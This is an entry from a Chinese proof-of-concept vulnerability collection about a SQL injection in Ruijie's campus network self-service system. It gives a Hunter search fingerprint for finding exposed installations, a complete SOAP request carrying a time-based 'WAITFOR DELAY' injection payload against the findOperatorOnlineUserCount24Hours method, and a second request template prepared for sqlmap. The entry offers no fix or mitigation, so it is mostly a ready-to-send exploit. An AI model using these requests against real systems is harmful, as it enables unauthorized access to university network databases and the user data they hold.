---

source: "wy876 漏洞文库"
---

# 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞

# 一、漏洞简介
锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞。

# 二、影响版本
+ 锐捷网络股份有限公司校园网自助服务系统

# 三、资产测绘
+ hunter`app="校园网自助服务系统"`
+ 特征


# 四、漏洞复现
```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et';WAITFOR DELAY '0:0:5'--</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```


sqlmap

```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ih7fhkepsw3xw3bf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
